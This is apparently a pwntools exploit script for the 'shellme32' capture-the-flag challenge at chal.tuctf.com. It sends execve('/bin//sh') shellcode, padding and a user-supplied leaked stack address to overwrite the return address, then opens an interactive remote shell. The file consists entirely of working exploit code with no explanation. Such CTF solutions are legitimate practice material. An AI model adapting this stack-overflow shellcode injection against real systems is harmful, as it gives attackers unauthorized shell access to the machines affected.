from pwn import *

context.binary = "./shellme32"
#context.terminal = ["tmux", "split", "-h"]

#r = process("./shellme32")

#gdb.attach(r)

r = remote('chal.tuctf.com', 30506)

payload = ""
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

#r.sendline(shellcode + cyclic(512))
# offset is 17

print r.recvline()
#base_addr = u32(r.recv(4).ljust(4, "\x00"))

#print("Base Address Leak: " + hex(base_addr))

payload = shellcode
payload += "A" * 12

print("Leaked address: " + r.recvline())

in_addr = raw_input("Type leak address:")
base_addr = int(in_addr, 16)
print hex(base_addr)
payload += p32(base_addr)

r.sendline(payload)

r.interactive()
